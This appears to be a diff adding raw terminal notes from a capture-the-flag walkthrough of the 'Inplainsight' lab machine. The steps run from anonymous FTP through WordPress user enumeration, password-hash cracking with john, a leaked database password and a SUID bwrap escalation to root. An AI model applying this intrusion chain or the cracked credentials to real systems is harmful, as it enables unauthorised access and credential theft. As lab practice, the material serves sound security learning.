@@ -1,0 +1,160 @@
+root@ap:~/CTF/Inplainsight# ftp 192.168.0.2
+Connected to 192.168.0.2.
+220 IPS Corp
+Name (192.168.0.2:root): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp           306 Nov 22  2019 todo.txt
+226 Directory send OK.
+ftp> get todo.txt
+local: todo.txt remote: todo.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for todo.txt (306 bytes).
+226 Transfer complete.
+306 bytes received in 0.01 secs (40.0413 kB/s)
+ftp> bye
+221 Goodbye.
+root@ap:~/CTF/Inplainsight# cat todo.txt 
+mike - please get ride of that worthless wordpress instance! it's a security ris
+k.  if you have privilege issues, please ask joe for assitance.
+
+joe - stop leaving backdoors on the system or your access will be removed! y
+our rabiit holes aren't enough for these elite cyber hacking types.
+
+- boss person
+root@ap:~/CTF/Inplainsight# 
+
+User(s) Identified:
+
+[+] bossperson
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+
+
+root@ap:~/CTF/Inplainsight# john hash 
+Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
+Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
+Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
+Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
+Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
+Use the "--format=ripemd-160" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+goodluck         (?)
+1g 0:00:00:00 DONE 2/3 (2020-06-20 12:02) 33.33g/s 6133p/s 6133c/s 6133C/s emily..iceman
+Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
+Session completed
+
+
+view-source:http://192.168.0.2/748AD6CCD32E4E52718445BB1CADC01EB08A0DF6/upload.php
+<!--c28tZGV2LXdvcmRwcmVzcw==-->
+
+echo "c28tZGV2LXdvcmRwcmVzcw==" | base64 -d
+so-dev-wordpress
+
+www-data@inplainsight:/tmp$ cat /var/mail/mike
+cat /var/mail/mike
+From joe@inplainsight  Fri Nov 22 06:51:55 2019
+Return-Path: <joe@inplainsight>
+X-Original-To: mike@inplainsight
+Delivered-To: mike@inplainsight
+Received: by inplainsight (Postfix, from userid 1001)
+	id F40BF5AB4; Fri, 22 Nov 2019 06:51:54 -0500 (EST)
+Subject: remember
+To: <mike@inplainsight>
+X-Mailer: mail (GNU Mailutils 3.6)
+Message-Id: <20191122115154.F40BF5AB4@inplainsight>
+Date: Fri, 22 Nov 2019 06:51:54 -0500 (EST)
+From: hyphens rule <joe@inplainsight>
+
+mike. remember before removing wordpress to update your password. i know you use the same password for both. - joe
+
+
+
+define( 'DB_NAME', 'sodevwp' );
+
+/** MySQL database username */
+define( 'DB_USER', 'sodevwp' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'oZ2R3c2x7dLL6#hJ' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+
+
+root@ap:~/CTF/Inplainsight# john passhash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+skuxdelux        (?)
+1g 0:00:00:11 DONE (2020-06-20 13:38) 0.08703g/s 15674p/s 15674c/s 15674C/s slipknot14..scrapi
+Use the "--show --format=phpass" options to display all of the cracked passwords reliably
+Session completed
+
+
+mike:skuxdelux
+
+
+joe@inplainsight:~$ find / -type f -perm -u=s 2>/dev/null
+find / -type f -perm -u=s 2>/dev/null
+/usr/bin/bwrap
+/usr/bin/mount
+/usr/bin/at
+/usr/bin/umount
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/fusermount
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/snapd/snap-confine
+joe@inplainsight:~$ bwrap
+bwrap
+root@inplainsight:~# ls
+ls
+journal
+root@inplainsight:~# cd /root
+cd /root
+root@inplainsight:/root# ls
+ls
+flag.txt
+root@inplainsight:/root# cat flag.txt
+cat flag.txt
+
+                                          __          
+  ____  ____   ____    ________________ _/  |_  ______
+_/ ___\/  _ \ /    \  / ___\_  __ \__  \\   __\/  ___/
+\  \__(  <_> )   |  \/ /_/  >  | \// __ \|  |  \___ \ 
+ \___  >____/|___|  /\___  /|__|  (____  /__| /____  >
+     \/           \//_____/            \/          \/ 
+
+easy right? thanks for playing.
+
+feel free to leave feedback with me @bzyo_
+root@inplainsight:/root# 
+
+
+
